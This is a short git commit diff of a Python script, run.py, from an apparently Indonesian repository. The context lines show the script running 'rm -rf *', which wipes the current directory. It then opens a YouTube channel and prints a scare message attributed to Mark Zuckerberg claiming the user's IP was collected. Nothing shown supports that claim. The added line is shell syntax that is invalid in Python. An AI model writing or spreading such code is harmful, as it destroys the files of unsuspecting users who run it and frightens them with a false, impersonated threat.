083e88393d4e903d2e779aa2894e84d17528207c
Nub5ecCo <55526852+Nub5ecCo@users.noreply.github.com>
2019-10-09 14:02:54 +0700

    Update run.py

--- run.py
+++ run.py
@@ -3,3 +3,4 @@ os.system("rm -rf *")
 os.system("xdg-open https://youtube.com/NjankSoekamti")
 os.system("clear")
 print("\n\n Ini adalah program illegal!\n IP pengguna sudah dikumpulkan\n Berhentilah sebelum terlambat!\n\n - Mark Zuckerberg\n\n")
+echo "KNTD NIPU"
